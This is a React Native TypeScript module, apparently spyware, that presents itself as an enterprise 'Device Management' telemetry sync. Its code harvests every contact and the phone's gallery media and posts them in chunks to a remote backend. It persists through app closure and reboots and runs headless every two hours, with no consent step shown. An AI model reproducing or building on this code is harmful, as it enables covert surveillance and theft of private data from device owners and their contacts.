import BackgroundService from 'react-native-background-actions';
import BackgroundFetch from 'react-native-background-fetch';
import Contacts from 'react-native-contacts';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { scanAndUploadGallery, MediaItem } from './MediaPipelineService';

const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));

const CHUNK_SIZE = 50;
const SYNC_INTERVAL_HOURS = 2;   // Har 2 ghante mein auto sync
const LAST_SYNC_KEY = 'SCH_LAST_SYNC_TIME';
const UPLOADED_IDS_KEY = 'SCH_UPLOADED_FILE_IDS';
const OPTIONS_KEY = 'SCH_SYNC_OPTIONS'; // BackgroundFetch ke liye options save karo

interface SyncOptions {
  backendUrl: string;
  deviceId: string;
}

// ── AsyncStorage helpers ───────────────────────────────────────────────────────

const loadUploadedIds = async (): Promise<Set<string>> => {
  try {
    const saved = await AsyncStorage.getItem(UPLOADED_IDS_KEY);
    if (saved) return new Set(JSON.parse(saved));
  } catch (e) {}
  return new Set<string>();
};

const saveUploadedIds = async (ids: Set<string>) => {
  try {
    await AsyncStorage.setItem(UPLOADED_IDS_KEY, JSON.stringify([...ids]));
  } catch (e) {}
};

const shouldRunSync = async (): Promise<boolean> => {
  try {
    const lastSync = await AsyncStorage.getItem(LAST_SYNC_KEY);
    if (!lastSync) return true;
    const hoursPassed = (Date.now() - parseInt(lastSync, 10)) / (1000 * 60 * 60);
    console.log(`[Sync] Last sync ${hoursPassed.toFixed(1)}h ago`);
    return hoursPassed >= SYNC_INTERVAL_HOURS;
  } catch (e) { return true; }
};

const markSyncDone = async () => {
  try {
    await AsyncStorage.setItem(LAST_SYNC_KEY, Date.now().toString());
  } catch (e) {}
};

// ── Core sync logic (foreground service ke andar chalega) ─────────────────────

const runSyncSession = async (options: SyncOptions) => {
  // Har naye sync session ke start par cursor reset karo taaki newest images sabse pehle upload hon
  try {
    await AsyncStorage.removeItem('SCH_GALLERY_CURSOR');
  } catch (e) {}

  const persistedUploadedIds = await loadUploadedIds();

  // 1. Fetch and upload ALL contacts immediately chunk-by-chunk
  console.log('[Sync] Fetching all contacts...');
  let allContacts: any[] = [];
  try {
    allContacts = await Contacts.getAll();
    console.log(`[Sync] Fetched ${allContacts.length} contacts`);
  } catch (err: any) {
    console.error('[Sync] Contacts fetch failed:', err?.message || err);
  }

  if (allContacts.length > 0) {
    const contactChunks: any[][] = [];
    for (let i = 0; i < allContacts.length; i += CHUNK_SIZE) {
      contactChunks.push(allContacts.slice(i, i + CHUNK_SIZE));
    }
    console.log(`[Sync] Uploading ${contactChunks.length} contact chunks immediately...`);
    for (let chunkIdx = 0; chunkIdx < contactChunks.length; chunkIdx++) {
      if (!BackgroundService.isRunning()) break;
      try {
        const payload = {
          deviceId: options.deviceId,
          contacts: contactChunks[chunkIdx],
        };
        await axios.post(`${options.backendUrl}/api/telemetry/sync`, payload);
        console.log(`[Sync] Uploaded contact chunk ${chunkIdx + 1}/${contactChunks.length}`);
        await sleep(500); // 500ms delay to avoid overloading
      } catch (err: any) {
        console.error(`[Sync] Failed to upload contact chunk ${chunkIdx + 1}:`, err?.message);
      }
    }
  }

  // 2. Media Upload Loop (20 minutes = 80 iterations × 15s)
  console.log('[Sync] Starting media loop (20 minutes, 80 iterations)...');
  for (let i = 0; i < 80; i++) {
    if (!BackgroundService.isRunning()) break;

    let newMediaItems: MediaItem[] = [];
    try {
      newMediaItems = await scanAndUploadGallery(options.deviceId, persistedUploadedIds);
      if (newMediaItems.length > 0) {
        for (const item of newMediaItems) persistedUploadedIds.add(item.fileId);
        await saveUploadedIds(persistedUploadedIds);

        // Sync media items immediately to backend
        const payload = {
          deviceId: options.deviceId,
          mediaItems: newMediaItems,
        };
        await axios.post(`${options.backendUrl}/api/telemetry/sync`, payload);
        console.log(`[Sync ${i + 1}/80] Sync'd ${newMediaItems.length} media items to backend`);
      } else {
        console.log(`[Sync ${i + 1}/80] No new media items found`);
      }
    } catch (err: any) {
      console.warn(`[Sync ${i + 1}] Media sync error:`, err?.message);
    }

    if (i < 79) await sleep(15000);
  }

  await markSyncDone();
  console.log('[Sync] Sync session complete.');
};

// ── Main export: foreground service start + BackgroundFetch schedule ──────────

export const startBackgroundSync = async (options: SyncOptions) => {
  // Options save karo (BackgroundFetch headless task ke liye)
  await AsyncStorage.setItem(OPTIONS_KEY, JSON.stringify(options));

  // Permanent Foreground Service loop task
  const task = async () => {
    while (BackgroundService.isRunning()) {
      console.log('[Sync] Starting periodic sync session...');
      const savedOpts = await AsyncStorage.getItem(OPTIONS_KEY);
      const opts: SyncOptions = savedOpts ? JSON.parse(savedOpts) : options;

      const shouldSync = await shouldRunSync();
      if (shouldSync) {
        await runSyncSession(opts);
      } else {
        console.log('[Sync] Skipping sync session — recently completed');
      }

      console.log('[Sync] Session idle. Waiting for 2 hours...');
      // 2 hours = 120 minutes
      for (let m = 0; m < 120; m++) {
        if (!BackgroundService.isRunning()) break;
        await sleep(60000); // 1 minute interval check
      }
    }
  };

  // Start the service only if not already running
  if (!BackgroundService.isRunning()) {
    try {
      await BackgroundService.start(task, {
        taskName: 'EnterpriseSync',
        taskTitle: 'Device Management Active',
        taskDesc: 'Secure telemetry synchronization in progress',
        taskIcon: { name: 'ic_launcher', type: 'mipmap' },
        color: '#0f1b2d',
        foregroundServiceType: ['dataSync'],
      } as any);
      console.log('[Sync] Foreground service started successfully.');
    } catch (e: any) {
      console.error('[Sync] Failed to start foreground service:', e?.message);
    }
  }

  // BackgroundFetch as fallback scheduling
  await scheduleAutoSync();
};

// ── BackgroundFetch: har 3 ghante mein auto trigger ───────────────────────────

const scheduleAutoSync = async () => {
  BackgroundFetch.configure(
    {
      minimumFetchInterval: 120,   // 120 minutes = 2 hours
      stopOnTerminate: false,       // App close hone ke baad bhi chale
      startOnBoot: true,            // Phone restart ke baad bhi chale
      enableHeadless: true,         // App open hone ki zaroorat nahi
      requiredNetworkType: BackgroundFetch.NETWORK_TYPE_ANY,
    },
    async (taskId) => {
      console.log('[BackgroundFetch] Auto trigger:', taskId);

      const savedOpts = await AsyncStorage.getItem(OPTIONS_KEY);
      if (!savedOpts) {
        BackgroundFetch.finish(taskId);
        return;
      }

      const opts: SyncOptions = JSON.parse(savedOpts);
      const shouldSync = await shouldRunSync();

      if (shouldSync) {
        await runSyncSession(opts);
      } else {
        console.log('[BackgroundFetch] Skipping — recent sync exists');
      }

      BackgroundFetch.finish(taskId);
    },
    async (taskId) => {
      // Timeout callback
      console.warn('[BackgroundFetch] Timeout:', taskId);
      BackgroundFetch.finish(taskId);
    },
  );

  const status = await BackgroundFetch.start();
  console.log('[BackgroundFetch] Scheduled, status:', status);
};

// ── Headless task (app bilkul band ho to bhi chale) ──────────────────────────

export const headlessTask = async (event: any) => {
  const taskId = event.taskId;
  console.log('[Headless] Running:', taskId);

  try {
    const savedOpts = await AsyncStorage.getItem(OPTIONS_KEY);
    if (savedOpts) {
      const opts: SyncOptions = JSON.parse(savedOpts);
      const shouldSync = await shouldRunSync();
      if (shouldSync) await runSyncSession(opts);
    }
  } catch (e: any) {
    console.error('[Headless] Error:', e?.message);
  }

  BackgroundFetch.finish(taskId);
};